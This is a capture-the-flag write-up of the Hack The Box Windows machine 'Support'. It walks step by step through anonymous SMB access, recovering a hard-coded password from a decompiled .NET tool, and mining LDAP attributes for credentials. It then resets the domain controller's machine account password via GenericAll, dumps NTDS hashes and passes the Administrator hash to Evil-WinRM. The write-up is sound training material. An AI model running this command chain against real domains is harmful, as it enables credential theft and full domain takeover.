---
title: "HTB • Support"
tags:
  - "Easy Difficulty"
  - "Intermediate"
  - "Windows"
  - "Active Directory"
  - "WinRM"
  - "SMB"
  - "LDAP"
  - "Reversing"
  - "Static Analysis"
  - "C Sharp"
excerpt: "Support is an easy-difficulty Windows machine on Hack the Box that involves hard-coded credentials, reversing, SMB, LDAP, and common pitfalls in Active Directory including sensitive information in accessible attributes and dangerous access control entries. Some of the tools we use include ILSpy, BloodHound, and Impacket"
categories:
  - "Writeups"
  - "Hack the Box Machines"
---

Support is an easy-difficulty machine created by [**0xdf**](https://app.hackthebox.com/users/4935) on [**Hack The Box**](https://app.hackthebox.com/machines/Support) featuring a domain controller that allows anonymous authentication on its **SMB** server which hosts a program that contains the password for the user **ldap**. This user is then used to dump accessible Active Directory objects, where we find an LDAP attribute for the user **support** which holds that user's password. It turns out, **support** has full access over the domain controller machine account, which is abused to change the password for that account and dump the NTDS secrets. The administrator's hash from the secrets is then used with WinRM to get a shell as **Administrator**

## Reconnaissance

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # replace with machine address
echo rhost=$rhost >> .env && . ./.env
ctfscan $rhost
```
{:.nolineno}

Some services mentioned in the scan results are **53/DNS**, **88/Kerberos**, and **389/LDAP**. The presence of these ports together indicates that this machine is likely an Active Directory domain controller.

## SMB

The first port that we'll enumerate is going to be SMB just because many SMB servers allow anonymous access.

### Anonymous Access

Let's try to use anonymous authentication to list available shares.

```bash
smbclient -N -L "//$rhost"
```
{:.nolineno}

Using anonymous authentication, we are able to get a list of shares including one unusual share named **support-tools**. Let's try to connect to this share and possibly download the contents.

```bash
mkdir "support-tools" && cd "support-tools"
smbclient -N "//$rhost/support-tools" -c 'recurse;prompt;mget *;exit'
```
{:.nolineno}

Once the contents are downloaded, we notice that one file called `UserInfo.exe.zip`{:.filepath} that stands out because it is not named like a known tool. Every other file seems to be related to known tools like Wireshark, PuTTY, SysInternals, etc.

### UserInfo Project

Let's try to unzip `UserInfo.exe.zip`{:.filepath}.

```bash
file="./UserInfo.exe.zip"
unzip -l "$file"
unzip "$file"
```
{:.nolineno}

The project has a central executable called `UserInfo.exe`{:.filepath}. Let's find out what it does.

#### Reversing

A good practice in reverse engineering is to conduct strict static analysis, then if it is inconclusive, jump to dynamic analysis. Let's try this both ways as a learning opportunity.

##### Static Analysis

We will be using the [cross-platform version of ILSpy](https://github.com/icsharpcode/AvaloniaILSpy) on Linux to decompile the program. You can find the compiled release that suits your OS on the [releases page](https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v7.2-rc). To analyze the `UserInfo.exe`{:.filepath} executable, we must first copy it to the `artifacts/linux-x64`{:.filepath} folder. Once that is done we can simply run the following.

```bash
./ILSpy UserInfo.exe
```
{:.nolineno}

![UserInfo disassembly](/assets/img/post/htb-machines-support/ilspy.png)
_ILSpy successfully decompiles the UserInfo.exe assembly_

Looking at the **UserInfo.Services** namespace in the decompiled program, a few details jump out:

*   The **Protected.getPassword** method takes **enc_password**, transforms it, and returns the result.
*   The **LdapQuery** class takes the return value of `Protected.getPassword()` and uses it as a password to perform LDAP authentication as the user **support\ldap**.

This means that Protected.getPassword method returns a value that is used as a password for the domain user **ldap**. Let's see if we could simulate the transformation of **enc_password** that takes place in this method using [CyberChef](https://gchq.github.io/CyberChef/).

##### CyberChef

**Protected.getPassword** performs three main operations to get its return value:
1.  **enc_password** is base64-decoded
1.  The result is XOR encrypted with the UTF-8 key "**armando**"
1.  The result is XOR encrypted with the hex key **0xDF**

When we perform the same operations on the initial string stored in the **enc_password** variable with CyberChef, we are able to recover the password.

![CyberChef decryption](/assets/img/post/htb-machines-support/cyberchef.png)
_We successfully recover the plaintext password_

## LDAP

Let's use [ldapsearch](https://linux.die.net/man/1/ldapsearch) to find any domain names expected by the server.

```bash
ldapsearch -x \
  -H "ldap://$rhost" \
  -s "base" \
  -b "" \
  "(objectClass=*)" \
  "rootDomainNamingContext"
```
{:.nolineno}

The root naming context seems to be `DC=support,DC=htb`, meaning the domain name would be **support.htb**.

### Sensitive Attributes

Now we will use a tool called [go-windapsearch](https://github.com/ropnop/go-windapsearch) with the credentials we discovered to dump the user objects in JSON format. We can either download the standalone off the [releases page](https://github.com/ropnop/go-windapsearch/releases) or build it from source. The reason we are doing this is because there are sometimes attributes that hold sensitive information like passwords, hashes, etc.

```bash
echo 'domain="support.htb"' >> .env && . ./.env # add domain to .env
ldap_password='' # Password we found for ldap user
windapsearch -j \
  -d "$domain" \
  -u "ldap" \
  -p "$ldap_password" \
  -m "users" \
  --attrs "*" \
  -o ./users.json
```
{:.nolineno}

Sure enough, the credentials are valid and we successfully gather the user objects into a new file called `users.json`{:.filepath}. Then we'll begin to process the data and look for any values that spark our interest using [jq](https://github.com/stedolan/jq) and some classic GNU utilities.

```bash
jq -r '..|strings' ./users.json |
  sort -u |
  awk '{print length,$0}' |
  sort -n |
  sed 's/[^ ]* //' |
  tee ./temp.txt
```
{:.nolineno}

This should get us every string value written to `temp.txt`{:.filepath} with no duplicates. The file contains a lot of SIDs, UUIDs, Dates, and other strings that are of little interest to us, but it also has one string on line 164 that has the structure of a password.

```bash
cat -n ./temp.txt | more
```
{:.nolineno}

We find which object and key the value is assigned to using the `jq` command once again.

```bash
jq ".[]|select(..==\"$suspectedPassword\")" ./users.json
```
{:.nolineno}

The string seems to be assigned to the info attribute of the user **support**. Could this be the password for this user?

```bash
echo "$suspectedPassword" |
  smbclient -U "support" -L "//$rhost"
```
{:.nolineno}

I guess so! Let's save those credentials and move on with some domain enumeration.

## Domain Enumeration

We'll be using [BloodHound.py](https://github.com/fox-it/BloodHound.py) to collect the domain information, and [BloodHound](https://github.com/BloodHoundAD/BloodHound) to graph it.

### BloodHound.py

We almost always should use the `-c All,LoggedOn` option when running `bloodhound-python`. The absence of that has caused me a lot of headache in the past.

```bash
bloodhound-python --zip \
  -ns "$rhost" \
  -d "$domain" \
  -u "ldap" \
  -p "$ldap_password" \
  -c "All,LoggedOn"
```
{:.nolineno}

This should get us a new archive that we'll upload to BloodHound.

### BloodHound

Once we clean up the database and upload our archive via the upload button on the top right, we can begin to explore this domain. We'll check for any dangerous rights for our two owned users, ldap and support.

#### Support User Object

The user _support_ is part of Two groups of interest:
* Remote Management Users
* Shared Support Accounts

The **Remote Management Users** group is pretty standard in Active Directory. To an attacker, it means that we can probably get a shell via WinRM. The **Shared Support Accounts** group however, is likely a custom group. In the real world, new AD security groups are often created to control and organize privileges, so it would make sense if this group had some sort of non-standard privilege.

![BloodHound group](/assets/img/post/htb-machines-support/group.png)
_We find out that the "Shared Support Accounts" group has special privileges_

Sure enough, the group has the **GenericAll** right over the domain controller machine account.

## Domain Takeover

Since we have the **GenericAll** privilege over the domain controller machine account, we can change the password using `addcomputer.py` from [impacket](https://github.com/fortra/impacket).

```bash
new_pass="$(openssl rand -base64 16)"
addcomputer.py \
  -no-add \
  -computer-name "DC$" \
  -computer-pass "$new_pass" \
  -dc-ip $rhost \
  "support.htb/support":"$support_pass"
```
{:.nolineno}

### Dumping the Secrets

Now we'll use the new password to dump the NTDS secrets with `secretsdump.py`{:.filepath} from impacket.

```bash
secretsdump.py \
  -just-dc \
  -outputfile secrets \
  'support.htb/DC$':"$new_pass"@"$rhost"
```
{:.nolineno}

Then we can get a shell as **Administrator** using the corresponding NT hash from the dump with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

```bash
evil-winrm -u "Administrator" -H $administrator_nt
```
{:.nolineno}

We then find and submit the user flag at `C:\Users\support\Desktop\user.txt`{:.filepath} and the root flag at `C:\Users\Administrator\Desktop\root.txt`{:.filepath}.
